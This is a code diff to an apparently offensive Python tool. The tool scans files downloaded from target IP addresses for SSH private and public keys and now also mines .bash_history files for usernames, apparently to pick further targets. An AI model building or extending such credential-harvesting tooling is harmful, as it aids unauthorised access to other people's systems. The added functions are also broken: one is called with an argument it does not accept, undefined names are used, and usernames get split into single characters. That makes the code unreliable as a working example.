@@ -23,6 +23,18 @@ def get_ssh_files(file_list: list):
                 continue
             ssh_files.append(file)
     return ssh_files
+
+def get_bash_history_files():
+    bash_hist_files = []
+    for file in file_list:
+        posix_path_str = str(file)
+        parts = posix_path_str.split("/")
+        if (parts[0] == "home" and parts[2] == ".bash_history") or (parts[1] == "home" and parts[3] == ".bash_history"):
+            if test_directory(file):
+                continue
+            bash_hist_files.append(posix_path_str)
+    return bash_hist_files
+
             
 # test if a file is a private key
 # this isnt an ideal solution but just a stop gap until a better one is found
@@ -65,6 +77,24 @@ def get_username_from_file_contents(contents: list):
                     valid_usernames.add(username)
     return valid_usernames
 
+def get_username_from_bash_history(contents: list):
+    valid_usernames = set()
+    for line in contents:
+        line_parts = line.split(" ")
+        if line_parts[0] != "cd":
+            continue
+        if len(line_parts) == 1:
+            continue # example: cd (no path)
+        # we know cd starts the line and there is likely a path 
+        path_parts = line_parts[1].split("/")
+        if path_parts[0] == '':
+            username = path_parts[2]
+        else:
+            username = path_parts[1]
+        valid_usernames.update(username)
+    return valid_usernames
+
+
 def get_contents_from_pub_keys(public_keys: list):
     all_usernames = set()
     for file in public_keys:
@@ -72,6 +102,14 @@ def get_contents_from_pub_keys(public_keys: list):
         with open(file, "r") as fp:
             file_lines = fp.readlines()
         all_usernames.update(get_username_from_file_contents(file_lines))
+    return all_usernames
+
+def get_content_from_bash_history(bash_file_files: list):
+    all_usernames = set()
+    for file in bash_file_files:
+        with open(file, "r") as fp:
+            file_lines = fp.readlines()
+        all_usernames.update(get_username_from_bash_history(file_files))
     return all_usernames
 
 def get_all_targets(proxy_host_port: str):
@@ -82,8 +120,13 @@ def get_all_targets(proxy_host_port: str):
         if test_ipaddress(target):
             downloaded_files = get_directories(os.path.join("downloads", target))
             ssh_files = get_ssh_files(downloaded_files)
-            if len(ssh_files) == 0:
+            
+            bash_hist_files = get_bash_history_files(downloaded_files)
+            if len(ssh_files) == 0 and len(bash_hist_files) == 0:
                 continue
+            # get all usernames here
+            usernames_bash_hist = []
+
             # get a list of all the targets private keys
             list_of_private_keys = get_private_key(ssh_files)
             # get a list of all the targets public keys 
